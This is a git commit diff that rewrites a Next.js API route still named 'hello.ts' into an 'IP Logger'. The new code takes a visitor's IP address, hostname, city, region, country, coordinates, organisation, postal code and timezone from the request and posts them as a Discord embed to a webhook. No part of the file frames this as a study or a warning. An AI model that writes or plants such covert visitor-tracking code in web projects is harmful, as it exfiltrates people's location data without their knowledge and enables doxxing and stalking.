fbae9a6be711e4954377e7b1866a4f4958fe7869
Exspiravit <100397833+Exspiravit13@users.noreply.github.com>
2022-05-10 02:17:04 -0700

    Update hello.ts

--- pages/api/hello.ts
+++ pages/api/hello.ts
@@ -1,9 +1,16 @@
 // Next.js API route support: https://nextjs.org/docs/api-routes/introduction
+import { MessageEmbed } from 'discord.js'
 import type { NextApiRequest, NextApiResponse } from 'next'
 
 type Data = {
   ip?: string,
   hostname?: string,
+  city?: string,
+  region?: string,
+  country?: string,
+  loc?: string,
+  org?: string,
+  timezone?: string,
   message?: string,
   name?: string
 }
@@ -18,15 +25,36 @@ export default async function handler(
     return res.status(405).send({ message: 'Only POST requests allowed!' })
   }
 
-  const ip: string = req.data.ip
-  const hostname: string = req.data.hostname
+
+  const ip: string = req.body.ip
+  const hostname: string = req.body.hostname
+  const city: string = req.body.city
+  const region: string = req.body.region
+  const country: string = req.body.country
+  const loc: string = req.body.loc
+  const org: string = req.body.org
+  const postal: string = req.body.postal
+  const timezone: string = req.body.timezone
+
+  var embed = new MessageEmbed()
+    .setDescription(`**IP Logger: ** 
+    \n**IP: ** ${ip}
+    \n**Hostname: ** ${hostname}
+    \n**City: ** ${city}
+    \n**Region: ** ${region}
+    \n**Country: ** ${country}
+    \n**Loc: ** ${loc}
+    \n**Org: ** ${org}
+    \n**Postal: ** ${postal}
+    \n**Timezone: ** ${timezone}`)
+
   await fetch(webhook, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
     },
-    body: JSON.stringify({ content: ip + hostname })
+    body: JSON.stringify({ content: embed })
   })
-    .catch(error => console.error('IP:', ip + `HOSTNAME:`, hostname))
+    .catch(error => console.error('IP:', ip +  `Country:`, country + `Region:`, region + `City:`, city))
   return res.status(204).end()
-}
+};
